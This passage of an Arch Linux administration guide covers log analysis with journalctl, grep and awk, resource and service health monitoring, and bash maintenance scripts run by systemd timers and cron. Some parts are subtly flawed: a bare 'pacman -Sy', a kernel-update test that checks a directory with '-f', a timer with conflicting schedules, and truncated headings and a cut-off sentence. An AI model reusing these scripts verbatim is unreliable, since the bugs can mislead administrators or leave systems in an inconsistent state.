sudo systemctl restart systemd-journald
```

### Traditional Log Files

#### Important Log Locations

**System logs directory:**
```
/var/log/
```

**Common log files:**
```
/var/log/Xorg.0.log          # X server
/var/log/pacman.log          # Package manager
/var/log/boot.log            # Boot messages (if configured)
/var/log/btmp                # Failed logins
/var/log/wtmp                # Login records
```

**Application logs:**
```
~/.xsession-errors           # X session errors
~/.local/share/xorg/         # User X logs
```

#### Viewing Traditional Logs

**Xorg logs:**
```
cat /var/log/Xorg.0.log
grep -i "error\|warning" /var/log/Xorg.0.log
```

**Last logins:**
```
last -n 20
```

**Failed login attempts:**
```
sudo lastb
```

### Log Analysis Tools

#### grep for Pattern Matching

**Case-insensitive search:**
```
journalctl -b | grep -i "error"
```

**Multiple patterns:**
```
journalctl -b | grep -E "error|fail|critical"
```

**Inverted match (exclude):**
```
journalctl -b | grep -v "Started"
```

**Count occurrences:**
```
journalctl -b | grep -c "error"
```

**Context lines:**
```
journalctl -b | grep -A 5 -B 5 "error"
```

Shows 5 lines before and after each match.

#### awk for Field Extraction

**Extract specific fields:**
```
journalctl -o short | awk '{print $1, $2, $5}'
```

**Filter by field value:**
```
journalctl -o short | awk '$5 == "sshd"'
```

**Count by service:**
```
journalctl -b -o json | jq -r '._SYSTEMD_UNIT' | sort | uniq -c | sort -rn | head
```

#### less for Interactive Viewing

**Search while viewing:**
```
journalctl -b | less
```

In less:
- `/pattern` - Search forward
- `?pattern` - Search backward
- `n` - Next match
- `N` - Previous match
- `q` - Quit

### Practical Analysis Scenarios

#### Scenario 1: System Won't Boot

**From recovery environment:**
```
# Mount system
mount /dev/sdXn /mnt
journalctl --root=/mnt -b -1 -p err
```

Analyzes previous boot's errors.

#### Scenario 2: Service Keeps Crashing

**View crash history:**
```
journalctl -u service-name.service --since "24 hours ago"
```

**Find crash pattern:**
```
journalctl -u service-name.service | grep -B 5 "Failed\|Stopped"
```

**Check resource limits:**
```
journalctl -u service-name.service | grep -i "limit\|resource"
```

#### Scenario 3: Performance Issues

**High load investigation:**
```
journalctl -b | grep -i "cpu\|load\|performance"
```

**Memory pressure:**
```
journalctl -b | grep -i "memory\|swap"
```

**I/O issues:**
```
journalctl -k | grep -i "i/o error"
```

#### Scenario 4: Security Audit

**All authentication events:**
```
journalctl -b | grep -i "auth\|login\|sudo"
```

**Failed access attempts:**
```
journalctl -b | grep -i "failed\|denied\|invalid"
```

**Privilege escalation:**
```
journalctl _COMM=sudo
```

**Account changes:**
```
journalctl | grep -i "user\|group\|password"
```

### Automated Log Analysis

#### Daily Error Summary Script

```bash
#!/bin/bash
# Daily error summary

REPORT="/tmp/error-report-$(date +%Y%m%d).txt"

echo "=== Daily Error Summary ===" > "$REPORT"
echo "Date: $(date)" >> "$REPORT"
echo "" >> "$REPORT"

# Critical errors
echo "Critical Errors:" >> "$REPORT"
journalctl --since today -p crit --no-pager >> "$REPORT"
echo "" >> "$REPORT"

# Service failures
echo "Failed Services:" >> "$REPORT"
systemctl --failed --no-pager >> "$REPORT"
echo "" >> "$REPORT"

# Kernel errors
echo "Kernel Errors:" >> "$REPORT"
journalctl -k --since today -p err --no-pager >> "$REPORT"

# Email or display report
cat "$REPORT"
```

#### Log Monitoring with Alerts

```bash
#!/bin/bash
# Monitor for critical messages

journalctl -f -p crit | while read line; do
    echo "CRITICAL: $line"
    notify-send "Critical System Error" "$line"
    # Or send email
    # echo "$line" | mail -s "Critical Error" admin@example.com
done
```

### Best Practices

**Regular review:** Check logs weekly for warnings and errors.

**Prioritize errors:** Focus on error and critical messages first.

**Use filters:** Narrow logs to specific services or time periods.

**Correlate events:** Look for patterns across different logs.

**Archive important logs:** Save logs from critical incidents.

**Clean regularly:** Prevent logs from consuming excessive disk space.

**Monitor in real-time:** Use `journalctl -f` during troubleshooting.

**Understand context:** Read surrounding messages, not just the error line.

**Document findings:** Keep notes on recurring issues and solutions.

**Learn patterns:** Recognize common error messages and their meanings.

Effective log analysis is critical for maintaining system health, diagnosing problems quickly, and understanding system behavior on Arch Linux.

## System Health Monitoring

### Overview

System health monitoring on Arch Linux involves tracking system resources, performance metrics, service status, and potential issues. Proactive monitoring prevents problems before they cause system failures or degraded performance.

### Quick Health Checks

#### Essential Status Commands

**Failed services:**
```
systemctl --failed
```

Should show "0 loaded units listed" on healthy system.

**System load:**
```
uptime
```

Shows load average for 1, 5, and 15 minutes.

**Disk space:**
```
df -h
```

Monitor for partitions over 80% usage.

**Memory usage:**
```
free -h
```

Check available memory and swap usage.

**Top processes:**
```
top
```

Or interactive:
```
htop
```

**Recent errors:**
```
journalctl -p err -b --no-pager | tail -20
```

### Resource Monitoring

#### CPU Monitoring

**Current CPU usage:**
```
top -bn1 | grep "Cpu(s)"
```

**CPU info:**
```
lscpu
cat /proc/cpuinfo
```

**Per-core usage:**
```
mpstat -P ALL
```

Requires `sysstat` package.

**Historical CPU stats:**
```
sar -u 5 12
```

Shows CPU usage every 5 seconds, 12 times.

**CPU temperature:**
```
sensors
```

Requires `lm_sensors` package.

**Setup sensors:**
```
sudo pacman -S lm_sensors
sudo sensors-detect
sensors
```

**Monitor temperature continuously:**
```
watch -n 2 sensors
```

#### Memory Monitoring

**Detailed memory stats:**
```
free -h
```

**Example output:**
```
              total        used        free      shared  buff/cache   available
Mem:           15Gi       5.2Gi       7.8Gi       432Mi       2.8Gi        9.8Gi
Swap:         8.0Gi          0B       8.0Gi
```

**Memory by process:**
```
ps aux --sort=-%mem | head -20
```

Shows top 20 memory-consuming processes.

**Memory details:**
```
cat /proc/meminfo
```

**OOM (Out of Memory) killer logs:**
```
journalctl -b | grep -i "out of memory\|oom"
```

**Swap usage:**
```
swapon --show
```

**Memory pressure:**
```
cat /proc/pressure/memory
```

#### Disk Monitoring

**Disk space usage:**
```
df -h
```

**Disk usage by directory:**
```
du -sh /* 2>/dev/null | sort -h
```

**Largest directories:**
```
sudo du -h / --max-depth=1 2>/dev/null | sort -rh | head -20
```

**Specific partition usage:**
```
du -sh /var/* | sort -h
```

**Find large files:**
```
sudo find / -type f -size +100M -exec ls -lh {} \; 2>/dev/null
```

**Disk I/O stats:**
```
iostat -x 2
```

Requires `sysstat` package; updates every 2 seconds.

**Monitor I/O per process:**
```
sudo iotop
```

Requires `iotop` package.

**SMART disk health:**
```
sudo smartctl -H /dev/sda
```

Requires `smartmontools` package.

**Detailed SMART **
```
sudo smartctl -a /dev/sda
```

#### Network Monitoring

**Network interfaces:**
```
ip addr
```

**Network statistics:**
```
ip -s link
```

**Active connections:**
```
ss -tuln
```

Shows TCP/UDP listening ports.

**Established connections:**
```
ss -tun
```

**Bandwidth usage:**
```
sudo iftop -i eth0
```

Requires `iftop` package.

**Network statistics over time:**
```
sar -n DEV 2 10
```

**Traffic by process:**
```
sudo nethogs
```

Requires `nethogs` package.

**Real-time bandwidth monitor:**
```
bmon
```

Requires `bmon` package.

### Service Health Monitoring

#### Systemd Service Status

**All running services:**
```
systemctl list-units --type=service --state=running
```

**Failed services:**
```
systemctl --failed
```

**Service dependency tree:**
```
systemctl list-dependencies service-name.service
```

**Service resource usage:**
```
systemd-cgtop
```

Shows CPU, memory, I/O per service.

**Specific service status:**
```
systemctl status service-name.service
```

**Service logs:**
```
journalctl -u service-name.service -b
```

#### Critical Services Check

**Essential services:**
```bash
#!/bin/bash
# Check critical services

SERVICES=(
    "sshd.service"
    "NetworkManager.service"
    "systemd-resolved.service"
    "cronie.service"
)

for service in "${SERVICES[@]}"; do
    if systemctl is-active --quiet "$service"; then
        echo "✓ $service: Running"
    else
        echo "✗ $service: FAILED"
    fi
done
```

### Log Monitoring

#### Real-Time Log Monitoring

**Follow all logs:**
```
journalctl -f
```

**Follow errors only:**
```
journalctl -f -p err
```

**Follow specific service:**
```
journalctl -u service-name.service -f
```

**Kernel messages:**
```
journalctl -kf
```

**Multiple services:**
```
journalctl -u sshd.service -u NetworkManager.service -f
```

#### Error Detection

**Recent errors:**
```
journalctl -p err --since "1 hour ago" --no-pager
```

**Critical messages:**
```
journalctl -p crit -b
```

**Segmentation faults:**
```
journalctl -b | grep segfault
```

**Core dumps:**
```
coredumpctl list
coredumpctl info
```

### Package System Health

#### Pacman Database Integrity

**Check database:**
```
sudo pacman -Dk
```

**Verify installed files:**
```
pacman -Qkk | grep -v "0 altered files"
```

Shows packages with modified files.

**Check for broken dependencies:**
```
pacman -Dk
```

**Orphaned packages:**
```
pacman -Qtdq
```

**Foreign packages (AUR):**
```
pacman -Qm
```

#### Comprehensive Package Check

```bash
#!/bin/bash
# Package system health check

echo "=== Package System Health ==="

# Database integrity
echo "Database integrity:"
sudo pacman -Dk

# Broken packages
echo -e "\nPackages with file issues:"
pacman -Qkk 2>&1 | grep -v "0 altered files"

# Orphans
ORPHANS=$(pacman -Qtdq | wc -l)
echo -e "\nOrphaned packages: $ORPHANS"

# Failed upgrades
echo -e "\nRecent errors:"
grep "error:" /var/log/pacman.log | tail -5

# Cache size
CACHE=$(du -sh /var/cache/pacman/pkg/ | cut -f1)
echo -e "\nCache size: $CACHE"
```

### Automated Monitoring Scripts

#### Daily Health Check Script

```bash
#!/bin/bash
# Daily system health check

REPORT="/tmp/health-$(date +%Y%m%d).txt"

echo "=== System Health Report ===" > "$REPORT"
echo "Date: $(date)" >> "$REPORT"
echo "" >> "$REPORT"

# System load
echo "System Load:" >> "$REPORT"
uptime >> "$REPORT"
echo "" >> "$REPORT"

# Disk space
echo "Disk Space:" >> "$REPORT"
df -h / /home >> "$REPORT"
echo "" >> "$REPORT"

# Memory
echo "Memory Usage:" >> "$REPORT"
free -h >> "$REPORT"
echo "" >> "$REPORT"

# Failed services
echo "Failed Services:" >> "$REPORT"
systemctl --failed --no-pager >> "$REPORT"
echo "" >> "$REPORT"

# Recent errors
echo "Recent Errors (last 24 hours):" >> "$REPORT"
journalctl --since "24 hours ago" -p err --no-pager | tail -20 >> "$REPORT"
echo "" >> "$REPORT"

# Orphaned packages
ORPHANS=$(pacman -Qtdq | wc -l)
echo "Orphaned packages: $ORPHANS" >> "$REPORT"
echo "" >> "$REPORT"

# Display report
cat "$REPORT"

# Alert if issues found
ISSUES=$(grep -c "FAILED\|error:" "$REPORT")
if [ $ISSUES -gt 0 ]; then
    notify-send "System Health Alert" "$ISSUES issues detected"
fi
```

**Schedule with cron:**
```
0 9 * * * /usr/local/bin/daily-health-check
```

#### Resource Alert Script

```bash
#!/bin/bash
# Alert on resource thresholds

# CPU threshold (80%)
CPU=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1)
if (( $(echo "$CPU > 80" | bc -l) )); then
    echo "WARNING: CPU usage at ${CPU}%"
fi

# Disk threshold (80%)
DISK=$(df / | tail -1 | awk '{print $5}' | sed 's/%//')
if [ $DISK -gt 80 ]; then
    echo "WARNING: Root partition ${DISK}% full"
fi

# Memory threshold (90%)
MEM_PERCENT=$(free | grep Mem | awk '{print ($3/$2) * 100}')
if (( $(echo "$MEM_PERCENT > 90" | bc -l) )); then
    echo "WARNING: Memory usage at ${MEM_PERCENT}%"
fi

# Failed services
FAILED=$(systemctl --failed --no-legend | wc -l)
if [ $FAILED -gt 0 ]; then
    echo "WARNING: $FAILED failed services detected"
fi
```

### GUI Monitoring Tools

#### System Monitors

**GNOME System Monitor:**
```
sudo pacman -S gnome-system-monitor
gnome-system-monitor
```

**KDE System Monitor:**
```
sudo pacman -S plasma-systemmonitor
plasma-systemmonitor
```

**htop (terminal-based):**
```
sudo pacman -S htop
htop
```

**btop (modern terminal monitor):**
```
sudo pacman -S btop
btop
```

**glances (comprehensive):**
```
sudo pacman -S glances
glances
```

#### Resource Graphs

**Conky (customizable display):**
```
sudo pacman -S conky
conky
```

**Netdata (web-based):**
```
sudo pacman -S netdata
sudo systemctl enable --now netdata
# Access at http://localhost:19999
```

### Hardware Health Monitoring

#### Temperature Monitoring

**Setup sensors:**
```
sudo pacman -S lm_sensors
sudo sensors-detect
```

Answer "yes" to all questions.

**View temperatures:**
```
sensors
```

**Monitor continuously:**
```
watch -n 2 sensors
```

**CPU temperature threshold alert:**
```bash
#!/bin/bash
# Check CPU temperature

TEMP=$(sensors | grep 'Package id 0:' | awk '{print $4}' | sed 's/+//;s/°C//')

if (( $(echo "$TEMP > 80" | bc -l) )); then
    echo "WARNING: CPU temperature at ${TEMP}°C"
    notify-send "Temperature Alert" "CPU at ${TEMP}°C"
fi
```

#### Disk Health

**Install smartmontools:**
```
sudo pacman -S smartmontools
```

**Enable monitoring:**
```
sudo systemctl enable --now smartd
```

**Check disk health:**
```
sudo smartctl -H /dev/sda
```

**Detailed SMART **
```
sudo smartctl -a /dev/sda
```

**Run self-test:**
```
sudo smartctl -t short /dev/sda
```

**View test results:**
```
sudo smartctl -l selftest /dev/sda
```

#### Battery Health (Laptops)

**Battery status:**
```
upower -i /org/freedesktop/UPower/devices/battery_BAT0
```

**Battery percentage:**
```
cat /sys/class/power_supply/BAT0/capacity
```

**Battery health:**
```
cat /sys/class/power_supply/BAT0/health
```

### Performance Metrics

#### System Performance Overview

**Install sysstat:**
```
sudo pacman -S sysstat
sudo systemctl enable --now sysstat
```

**CPU statistics:**
```
sar -u 2 5
```

**Memory statistics:**
```
sar -r 2 5
```

**I/O statistics:**
```
sar -b 2 5
```

**Network statistics:**
```
sar -n DEV 2 5
```

**Historical **
```
sar -f /var/log/sysstat/sa$(date +%d)
```

#### Benchmarking

**Disk speed test:**
```
sudo hdparm -Tt /dev/sda
```

**Disk write speed:**
```
dd if=/dev/zero of=/tmp/test bs=1M count=1024 conv=fdatasync
```

**Memory bandwidth:**
```
sudo pacman -S sysbench
sysbench memory run
```

**CPU benchmark:**
```
sysbench cpu run
```

### Notification System

#### Desktop Notifications

**Using notify-send:**
```bash
#!/bin/bash
# Send desktop notification for issues

if systemctl is-failed --quiet some-service; then
    notify-send -u critical "Service Failed" "some-service has failed"
fi
```

**Email notifications:**
```bash
#!/bin/bash
# Email critical errors

ERRORS=$(journalctl --since "1 hour ago" -p err --no-pager)

if [ -n "$ERRORS" ]; then
    echo "$ERRORS" | mail -s "System Errors" admin@example.com
fi
```

### Monitoring Dashboard

#### Create Status Dashboard Script

```bash
#!/bin/bash
# System dashboard

clear

echo "╔════════════════════════════════════════════════════════╗"
echo "║          SYSTEM HEALTH DASHBOARD                       ║"
echo "╚════════════════════════════════════════════════════════╝"
echo ""

# Uptime and load
echo "▶ System Status"
uptime
echo ""

# Disk space
echo "▶ Disk Usage"
df -h / /home | tail -2
echo ""

# Memory
echo "▶ Memory"
free -h | grep -E "Mem:|Swap:"
echo ""

# CPU temp
echo "▶ CPU Temperature"
sensors | grep -E "Package id|Core"
echo ""

# Failed services
echo "▶ Service Status"
FAILED=$(systemctl --failed --no-legend | wc -l)
if [ $FAILED -eq 0 ]; then
    echo "✓ All services running normally"
else
    echo "✗ $FAILED failed services:"
    systemctl --failed --no-legend
fi
echo ""

# Recent errors
echo "▶ Recent Errors"
ERROR_COUNT=$(journalctl -p err --since "1 hour ago" --no-pager | wc -l)
echo "Errors in last hour: $ERROR_COUNT"
echo ""

# Updates
echo "▶ Package Updates"
UPDATES=$(checkupdates 2>/dev/null | wc -l)
echo "Available updates: $UPDATES"
```

### Best Practices

**Regular checks:** Review system health daily or weekly.

**Set thresholds:** Define acceptable ranges for resources.

**Automate monitoring:** Use scripts and systemd timers for continuous monitoring.

**Act on alerts:** Investigate warnings promptly.

**Trend analysis:** Track metrics over time to identify patterns.

**Document baselines:** Know what's normal for your system.

**Prioritize issues:** Focus on critical errors first.

**Monitor proactively:** Don't wait for failures to check logs.

**Keep tools updated:** Ensure monitoring tools are current.

**Test alerts:** Verify notification systems work before you need them.

Effective system health monitoring prevents problems, enables quick troubleshooting, and maintains

## Automated Maintenance Scripts

### Overview

Automated maintenance scripts handle routine system tasks without manual intervention, ensuring consistent system upkeep, preventing issues, and saving administrative time. Proper automation balances convenience with safety and control.

### Basic Maintenance Script

#### Comprehensive Weekly Maintenance

```bash
#!/bin/bash
# /usr/local/bin/weekly-maintenance
# Weekly Arch Linux maintenance script

set -e  # Exit on error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Log file
LOG="/var/log/maintenance-$(date +%Y%m%d).log"

# Function to log with timestamp
log() {
    echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG"
}

# Function for success messages
success() {
    log "${GREEN}✓ $1${NC}"
}

# Function for error messages
error() {
    log "${RED}✗ $1${NC}"
}

# Function for info messages
info() {
    log "${YELLOW}ℹ $1${NC}"
}

log "=== Starting Weekly Maintenance ==="

# 1. Update package databases
info "Updating package databases..."
if pacman -Sy; then
    success "Package databases updated"
else
    error "Failed to update databases"
fi

# 2. Check for updates (don't install yet)
info "Checking for available updates..."
UPDATES=$(checkupdates 2>/dev/null | wc -l)
if [ $UPDATES -gt 0 ]; then
    info "$UPDATES updates available"
    checkupdates 2>/dev/null | tee -a "$LOG"
else
    success "System is up to date"
fi

# 3. Remove orphaned packages
info "Checking for orphaned packages..."
ORPHANS=$(pacman -Qtdq 2>/dev/null)
if [ -n "$ORPHANS" ]; then
    info "Removing orphaned packages..."
    pacman -Rns --noconfirm $ORPHANS && success "Orphans removed" || error "Failed to remove orphans"
else
    success "No orphaned packages found"
fi

# 4. Clean package cache
info "Cleaning package cache..."
paccache -rk3 && success "Cache cleaned (kept 3 versions)" || error "Cache cleaning failed"
paccache -ruk0 && success "Uninstalled packages removed from cache" || error "Failed to clean uninstalled packages"

# 5. Clean journal logs
info "Cleaning journal logs..."
journalctl --vacuum-time=2weeks && success "Journal logs cleaned" || error "Journal cleaning failed"

# 6. Check for failed services
info "Checking for failed services..."
FAILED=$(systemctl --failed --no-legend | wc -l)
if [ $FAILED -eq 0 ]; then
    success "No failed services"
else
    error "$FAILED failed services detected:"
    systemctl --failed --no-legend | tee -a "$LOG"
fi

# 7. Verify package database integrity
info "Verifying package database..."
if pacman -Dk &> /dev/null; then
    success "Package database integrity verified"
else
    error "Package database has issues"
fi

# 8. Report disk usage
info "Disk usage:"
df -h / /home | tail -2 | tee -a "$LOG"

# 9. Report cache sizes
info "Cache sizes:"
echo "Pacman cache: $(du -sh /var/cache/pacman/pkg/ 2>/dev/null | cut -f1)" | tee -a "$LOG"
echo "Journal size: $(journalctl --disk-usage 2>/dev/null | grep -oP 'archived and active journals take up \K.*')" | tee -a "$LOG"

# 10. Summary
log "=== Maintenance Complete ==="
log "Log saved to: $LOG"
```

**Installation:**
```
sudo nano /usr/local/bin/weekly-maintenance
sudo chmod +x /usr/local/bin/weekly-maintenance
```

**Test run:**
```
sudo /usr/local/bin/weekly-maintenance
```

### System Update Script with Safety Checks

```bash
#!/bin/bash
# /usr/local/bin/safe-update
# Safe system update with pre-checks

set -euo pipefail

# Configuration
MIN_FREE_SPACE=5242880  # 5GB in KB
BACKUP_DIR="/backup"
LOG="/var/log/safe-update-$(date +%Y%m%d-%H%M%S).log"

# Logging
exec 1> >(tee -a "$LOG")
exec 2>&1

echo "=== Safe System Update Script ==="
echo "Started: $(date)"
echo ""

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "Error: This script must be run as root"
    exit 1
fi

# 1. Check Arch news
echo "▶ Checking Arch Linux news..."
echo "Visit: https://archlinux.org/news/"
read -p "Have you checked Arch news for manual interventions? (y/n): " NEWS_CHECKED
if [ "$NEWS_CHECKED" != "y" ]; then
    echo "Please check Arch news before updating."
    exit 1
fi

# 2. Check disk space
echo ""
echo "▶ Checking disk space..."
FREE_SPACE=$(df / | tail -1 | awk '{print $4}')
if [ $FREE_SPACE -lt $MIN_FREE_SPACE ]; then
    echo "Error: Insufficient disk space"
    echo "Free space: $(numfmt --to=iec-i --suffix=B $((FREE_SPACE * 1024)))"
    echo "Required: 5GB"
    exit 1
fi
echo "✓ Sufficient disk space: $(numfmt --to=iec-i --suffix=B $((FREE_SPACE * 1024)))"

# 3. Check network connectivity
echo ""
echo "▶ Checking network connectivity..."
if ping -c 3 archlinux.org &>/dev/null; then
    echo "✓ Network connection OK"
else
    echo "Error: No network connection"
    exit 1
fi

# 4. Backup /etc
echo ""
echo "▶ Backing up /etc directory..."
mkdir -p "$BACKUP_DIR"
tar -czf "$BACKUP_DIR/etc-$(date +%Y%m%d-%H%M%S).tar.gz" /etc 2>/dev/null
echo "✓ Backup created: $BACKUP_DIR/etc-$(date +%Y%m%d-%H%M%S).tar.gz"

# 5. Create snapshot if Timeshift is available
echo ""
if command -v timeshift &>/dev/null; then
    echo "▶ Creating Timeshift snapshot..."
    timeshift --create --comments "Pre-update $(date +%Y%m%d)" --scripted
    echo "✓ Snapshot created"
else
    echo "ℹ Timeshift not installed, skipping snapshot"
fi

# 6. Update keyring first
echo ""
echo "▶ Updating archlinux-keyring..."
pacman -Sy archlinux-keyring --noconfirm
echo "✓ Keyring updated"

# 7. Show what will be updated
echo ""
echo "▶ Available updates:"
checkupdates 2>/dev/null || echo "System is up to date"
echo ""
read -p "Proceed with system update? (y/n): " PROCEED

if [ "$PROCEED" != "y" ]; then
    echo "Update cancelled"
    exit 0
fi

# 8. Perform system update
echo ""
echo "▶ Starting system update..."
pacman -Syu --noconfirm

# 9. Update AUR packages if helper is available
echo ""
if command -v yay &>/dev/null; then
    echo "▶ Updating AUR packages..."
    sudo -u $(logname) yay -Sua --noconfirm
elif command -v paru &>/dev/null; then
    echo "▶ Updating AUR packages..."
    sudo -u $(logname) paru -Sua --noconfirm
else
    echo "ℹ No AUR helper found, skipping AUR updates"
fi

# 10. Clean up
echo ""
echo "▶ Cleaning up..."
paccache -rk2
paccache -ruk0

# 11. Remove orphans
echo ""
echo "▶ Checking for orphaned packages..."
ORPHANS=$(pacman -Qtdq 2>/dev/null)
if [ -n "$ORPHANS" ]; then
    echo "Removing orphaned packages..."
    pacman -Rns --noconfirm $ORPHANS
else
    echo "No orphaned packages found"
fi

# 12. Check for failed services
echo ""
echo "▶ Checking system health..."
FAILED=$(systemctl --failed --no-legend | wc -l)
if [ $FAILED -eq 0 ]; then
    echo "✓ All services running normally"
else
    echo "⚠ Warning: $FAILED failed services detected"
    systemctl --failed
fi

# 13. Check if reboot needed
echo ""
if [ -f /usr/lib/modules/$(uname -r) ]; then
    echo "✓ Current kernel is up to date"
else
    echo "⚠ Warning: Kernel was updated, reboot recommended"
    read -p "Reboot now? (y/n): " REBOOT
    if [ "$REBOOT" == "y" ]; then
        echo "Rebooting in 5 seconds..."
        sleep 5
        reboot
    fi
fi

echo ""
echo "=== Update Complete ==="
echo "Finished: $(date)"
echo "Log saved to: $LOG"
```

### Automated Cleanup Script

```bash
#!/bin/bash
# /usr/local/bin/auto-cleanup
# Automated system cleanup

LOG="/var/log/cleanup-$(date +%Y%m%d).log"
exec 1> >(tee -a "$LOG")
exec 2>&1

echo "=== Automated Cleanup Script ==="
echo "Started: $(date)"

# 1. Clean package cache (keep 2 versions)
echo ""
echo "▶ Cleaning package cache..."
paccache -rk2
paccache -ruk0

CACHE_SIZE=$(du -sh /var/cache/pacman/pkg/ | cut -f1)
echo "Current cache size: $CACHE_SIZE"

# 2. Clean journal logs (keep 2 weeks)
echo ""
echo "▶ Cleaning journal logs..."
journalctl --vacuum-time=2weeks

JOURNAL_SIZE=$(journalctl --disk-usage | grep -oP 'archived and active journals take up \K[^ ]*')
echo "Current journal size: $JOURNAL_SIZE"

# 3. Clean user caches (optional)
echo ""
echo "▶ Cleaning user caches..."

# Browser caches
for user in /home/*; do
    username=$(basename "$user")
    if [ -d "$user/.cache/mozilla" ]; then
        find "$user/.cache/mozilla" -type f -atime +30 -delete
        echo "Cleaned Firefox cache for $username"
    fi
    if [ -d "$user/.cache/chromium" ]; then
        find "$user/.cache/chromium" -type f -atime +30 -delete
        echo "Cleaned Chromium cache for $username"
    fi
done

# 4. Clean thumbnails
echo ""
echo "▶ Cleaning thumbnail caches..."
for user in /home/*; do
    username=$(basename "$user")
    if [ -d "$user/.cache/thumbnails" ]; then
        find "$user/.cache/thumbnails" -type f -atime +30 -delete
        echo "Cleaned thumbnails for $username"
    fi
done

# 5. Clean temporary files
echo ""
echo "▶ Cleaning temporary files..."
find /tmp -type f -atime +7 -delete 2>/dev/null
find /var/tmp -type f -atime +7 -delete 2>/dev/null

# 6. Remove old log files
echo ""
echo "▶ Removing old log files..."
find /var/log -name "*.old" -delete
find /var/log -name "*.gz" -mtime +30 -delete

# 7. Report space freed
echo ""
echo "=== Cleanup Summary ==="
df -h / | tail -1

echo ""
echo "Cleanup completed: $(date)"
```

### AUR Package Rebuild Script

```bash
#!/bin/bash
# /usr/local/bin/rebuild-aur
# Rebuild AUR packages after library updates

LOG="/var/log/aur-rebuild-$(date +%Y%m%d).log"
exec 1> >(tee -a "$LOG")
exec 2>&1

echo "=== AUR Package Rebuild Script ==="
echo "Started: $(date)"

# Check if AUR helper is available
if ! command -v yay &>/dev/null && ! command -v paru &>/dev/null; then
    echo "Error: No AUR helper found (yay or paru)"
    exit 1
fi

# Get list of foreign packages
echo ""
echo "▶ Checking for foreign packages..."
FOREIGN=$(pacman -Qmq)

if [ -z "$FOREIGN" ]; then
    echo "No foreign packages installed"
    exit 0
fi

echo "Found $(echo "$FOREIGN" | wc -l) foreign packages"

# Show packages to rebuild
echo ""
echo "Packages to rebuild:"
echo "$FOREIGN"

read -p "Proceed with rebuild? (y/n): " PROCEED
if [ "$PROCEED" != "y" ]; then
    echo "Rebuild cancelled"
    exit 0
fi

# Rebuild packages
echo ""
echo "▶ Rebuilding packages..."

if command -v yay &>/dev/null; then
    yay -S $FOREIGN --rebuild --noconfirm
elif command -v paru &>/dev/null; then
    paru -S $FOREIGN --rebuild --noconfirm
fi

echo ""
echo "=== Rebuild Complete ==="
echo "Finished: $(date)"
```

### Health Check and Alert Script

```bash
#!/bin/bash
# /usr/local/bin/health-check
# System health check with alerts

# Thresholds
CPU_THRESHOLD=80
DISK_THRESHOLD=80
MEM_THRESHOLD=90

# Alert function
alert() {
    MESSAGE="$1"
    echo "ALERT: $MESSAGE"
    
    # Desktop notification
    if command -v notify-send &>/dev/null; then
        notify-send -u critical "System Alert" "$MESSAGE"
    fi
    
    # Log to journal
    logger -p user.crit "health-check: $MESSAGE"
    
    # Email (if configured)
    # echo "$MESSAGE" | mail -s "System Alert" admin@example.com
}

# Check CPU usage
CPU=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1 | cut -d'.' -f1)
if [ $CPU -gt $CPU_THRESHOLD ]; then
    alert "CPU usage high: ${CPU}%"
fi

# Check disk space
DISK=$(df / | tail -1 | awk '{print $5}' | sed 's/%//')
if [ $DISK -gt $DISK_THRESHOLD ]; then
    alert "Disk usage high: ${DISK}%"
fi

# Check memory usage
MEM_PERCENT=$(free | grep Mem | awk '{printf "%.0f", ($3/$2) * 100}')
if [ $MEM_PERCENT -gt $MEM_THRESHOLD ]; then
    alert "Memory usage high: ${MEM_PERCENT}%"
fi

# Check failed services
FAILED=$(systemctl --failed --no-legend | wc -l)
if [ $FAILED -gt 0 ]; then
    alert "$FAILED services have failed"
fi

# Check for system errors
ERROR_COUNT=$(journalctl -p err --since "1 hour ago" --no-pager | wc -l)
if [ $ERROR_COUNT -gt 10 ]; then
    alert "$ERROR_COUNT errors in the last hour"
fi

# Check available updates
UPDATES=$(checkupdates 2>/dev/null | wc -l)
if [ $UPDATES -gt 50 ]; then
    alert "$UPDATES package updates available"
fi
```

### Systemd Service and Timer Setup

#### Create Systemd Service

```ini
# /etc/systemd/system/weekly-maintenance.service
[Unit]
Description=Weekly System Maintenance
After=network-online.target

[Service]
Type=oneshot
ExecStart=/usr/local/bin/weekly-maintenance
StandardOutput=journal
StandardError=journal
```

#### Create Systemd Timer

```ini
# /etc/systemd/system/weekly-maintenance.timer
[Unit]
Description=Run weekly maintenance
Requires=weekly-maintenance.service

[Timer]
OnCalendar=Sun 03:00
Persistent=true
RandomizedDelaySec=30min

[Install]
WantedBy=timers.target
```

**Enable timer:**
```
sudo systemctl daemon-reload
sudo systemctl enable --now weekly-maintenance.timer
```

**Check timer status:**
```
systemctl list-timers weekly-maintenance.timer
systemctl status weekly-maintenance.timer
```

**View logs:**
```
journalctl -u weekly-maintenance.service
```

### Multiple Maintenance Timers

#### Daily cleanup timer:
```ini
# /etc/systemd/system/daily-cleanup.timer
[Unit]
Description=Daily cleanup tasks

[Timer]
OnCalendar=daily
OnCalendar=02:00
Persistent=true

[Install]
WantedBy=timers.target
```

#### Health check timer (every 4 hours):
```ini
# /etc/systemd/system/health-check.timer
[Unit]
Description=System health check

[Timer]
OnCalendar=*-*-* 00/4:00:00
Persistent=true

[Install]
WantedBy=timers.target
```

### Cron-Based Alternative

```cron
# /etc/cron.d/arch-maintenance

# Weekly full maintenance (Sunday 3 AM)
0 3 * * 0 root /usr/local/bin/weekly-maintenance

# Daily cleanup (2 AM)
0 2 * * * root /usr/local/bin/auto-cleanup

# Health check every 4 hours
0 */4 * * * root /usr/local/bin/health-check

# Monthly AUR rebuild (first Sunday, 4 AM)
0 4 1-7 * 0 root /usr/local/bin/rebuild-aur
```

### Best Practices

**Test thoroughly:** Test all scripts manually before automating.

**Log everything:** Maintain detailed logs of all automated actions.

**Set conservative schedules:** Don't run scripts too frequently.

**Include safety checks:** Verify conditions before destructive operations.

**Notification system:** Alert on failures or important events.

**User confirmation:** For critical operations, require manual approval.

**Backup first:** Always backup before automated system changes.

**Monitor execution:** Regularly check that automated tasks are running.

**Document scripts:** Comment code and maintain documentation.

**Version control:** Track script changes in git.

**Idempotent operations:** Scripts should be safe to run multiple times.

**Error handling:** Scripts should handle and report errors gracefully.

Automated maintenance scripts ensure consistent system upkeep while reducing administrative burden, but must be carefully designed and monitored to prevent unintended consequences.

